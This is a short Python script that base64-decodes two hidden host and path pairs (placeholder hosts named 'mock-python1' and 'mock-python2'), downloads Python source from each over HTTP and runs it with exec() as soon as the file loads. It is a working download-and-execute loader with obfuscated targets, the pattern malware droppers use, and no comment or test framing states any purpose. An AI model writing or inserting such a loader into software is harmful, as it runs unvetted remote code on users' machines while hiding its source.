import http.client
import types
import base64

def get_encoded_hosts_and_paths():
    return [("bW9jay1weXRob24x", "L2V4ZWN1dGUxLnB5"), ("bW9jay1weXRob24y", "L2V4ZWN1dGUyLnB5")]

def get_decoded_host_and_path(encoded_host, encoded_path):
    host = base64.b64decode(encoded_host).decode('utf-8')
    path = base64.b64decode(encoded_path).decode('utf-8')
    return host, path

def fetch_response(host, path):
    connection = http.client.HTTPConnection(host)
    connection.request("GET", path)
    response = connection.getresponse()
    source = response.read().decode('utf-8')
    connection.close()
    return source

def create_module():
    return types.ModuleType("sm")

def exec_code(src, module):
    exec(src, module.__dict__)

def main():
    encoded_hosts_and_paths = get_encoded_hosts_and_paths()
    for encoded_host, encoded_path in encoded_hosts_and_paths:
        host, path = get_decoded_host_and_path(encoded_host, encoded_path)
        source = fetch_response(host, path)
        module = create_module()
        exec_code(source, module)

main()
